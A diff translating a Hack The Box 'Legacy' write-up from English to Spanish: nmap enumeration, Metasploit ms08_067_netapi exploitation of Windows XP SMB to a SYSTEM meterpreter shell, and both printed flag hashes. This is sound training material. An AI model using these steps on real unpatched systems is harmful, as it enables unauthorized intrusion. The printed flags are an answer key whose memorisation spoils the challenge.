@@ -1,16 +1,16 @@
 # Legacy — HTB Writeup
 
-**Author:** Ph4n3s  
-**Difficulty:** Easy  
+**Autor:** Ph4n3s  
+**Dificultad:** Easy  
 **OS:** Windows XP  
 
 ---
 
-## 1. Enumeration
+## 1. Enumeración
 
-We start with a `ping -c 5` to the machine. It replies with TTL 127, which tells us it is a Windows machine (Linux usually gives 64, Windows 128, and it drops by one as it passes through a hop).
+Empezamos con un `ping -c 5` a la máquina. Responde con TTL 127, lo que nos indica que es una máquina Windows (Linux suele dar 64, Windows 128, y al pasar por un salto baja uno).
 
-### 1.1 Open port scan
+### 1.1 Escaneo de puertos abiertos
 
 ```bash
 nmap -p- --open -T4 --min-rate 5000 10.129.227.181 -oN ~/HTB_machines/Legacy/ports
@@ -23,7 +23,7 @@ PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 ```
 
-### 1.2 Scan dedicated to the open ports
+### 1.2 Escaneo dedicado a los puertos abiertos
 
 ```bash
 nmap -p 135,139,445 -T4 --min-rate 5000 -sVC 10.129.227.181 -oN ~/HTB_machines/Legacy/targeted
@@ -45,15 +45,15 @@ Host script results:
 |   message_signing: disabled (dangerous, but default)
 ```
 
-We confirm it is a **Windows XP**, an unsupported system. The three open ports (135, 139, 445) are classic SMB/RPC services with known vulnerabilities. Time to find an exploit.
+Confirmamos que es un **Windows XP**, sistema sin soporte. Los tres puertos abiertos (135, 139, 445) son servicios SMB/RPC clásicos con vulnerabilidades conocidas. Toca buscar exploit.
 
 ---
 
-## 2. Exploitation
+## 2. Explotación
 
-The chosen exploit is `exploit/windows/smb/ms08_067_netapi`, a critical vulnerability in the Windows Server service that affects XP SP2/SP3 and allows unauthenticated remote code execution.
+El exploit elegido es `exploit/windows/smb/ms08_067_netapi`, una vulnerabilidad crítica en el servicio Server de Windows que afecta a XP SP2/SP3 y permite ejecución remota de código sin autenticación.
 
-We start `msfconsole` and configure:
+Arrancamos `msfconsole` y configuramos:
 
 ```
 use exploit/windows/smb/ms08_067_netapi
@@ -62,13 +62,13 @@ set LHOST 10.10.16.120
 run
 ```
 
-Within seconds we have a meterpreter session. We switch to an interactive shell:
+En pocos segundos tenemos sesión meterpreter. Pasamos a shell interactiva:
 
 ```
 shell
 ```
 
-We list the system users:
+Listamos usuarios del sistema:
 
 ```
 net user
@@ -80,40 +80,40 @@ Administrator   Guest   HelpAssistant   john   SUPPORT_388945a0
 
 ---
 
-## 3. Post-exploitation
+## 3. Post-explotación
 
-### 3.1 User flag
+### 3.1 Flag de usuario
 
-Important: on Windows XP the profiles are **not in `C:\Users`** (that is Vista onward), but in:
+Importante: en Windows XP los perfiles **no están en `C:\Users`** (eso es Vista en adelante), sino en:
 
 ```
 C:\Documents and Settings\
 ```
 
-You have to use quotes because the path has spaces:
+Hay que poner comillas porque la ruta tiene espacios:
 
 ```
 cd "C:\Documents and Settings\john\Desktop"
 type user.txt
 ```
 
-**User flag:** `e69af0e4f443de7e36876fda4ec7644f`
+**Flag usuario:** `e69af0e4f443de7e36876fda4ec7644f`
 
-### 3.2 Administrator flag
+### 3.2 Flag de administrador
 
-Since we entered directly as SYSTEM with the exploit, we have full access with no need to escalate privileges:
+Al haber entrado directamente como SYSTEM con el exploit, tenemos acceso total sin necesidad de escalar privilegios:
 
 ```
 cd "C:\Documents and Settings\Administrator\Desktop"
 type root.txt
 ```
 
-**Root flag:** `993442d258b0e0ec917cae9e695d5713`
+**Flag root:** `993442d258b0e0ec917cae9e695d5713`
 
 ---
 
-## Conclusion
+## Conclusión
 
-A simple but very educational machine for understanding how SMB exploitation works on unpatched systems. The `ms08_067_netapi` exploit is practically automatic, which makes it ideal to get started with Metasploit.
+Máquina sencilla pero muy didáctica para entender cómo funciona la explotación de SMB en sistemas sin parchear. El exploit `ms08_067_netapi` es prácticamente automático, lo que la hace ideal para iniciarse con Metasploit.
 
-What I took away: do not assume modern Windows paths on old systems — `C:\Users` does not exist on XP.
+Lo que me llevé: no asumir rutas de Windows moderno en sistemas antiguos — `C:\Users` no existe en XP.
